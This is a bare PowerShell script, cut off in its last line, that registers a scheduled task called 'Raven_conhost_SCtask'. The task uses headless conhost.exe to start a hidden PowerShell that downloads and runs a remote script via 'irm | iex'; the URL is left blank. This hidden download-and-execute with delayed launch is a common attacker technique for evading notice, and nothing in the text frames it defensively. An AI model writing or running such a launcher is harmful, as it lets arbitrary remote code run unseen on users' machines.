$taskAction = New-ScheduledTaskAction -Execute "conhost.exe" -Argument " --headless powershell -NoP -W H -C irm  | iex"
$taskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries
$taskRunAs = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME"
$scheduledTask = New-ScheduledTask -Action $taskAction -Trigger $taskTrigger -Principal $taskRunAs -Settings $settings 
Register-ScheduledTask -TaskName "Raven_conhost_SCtask" -InputObject $scheduledTask -Forc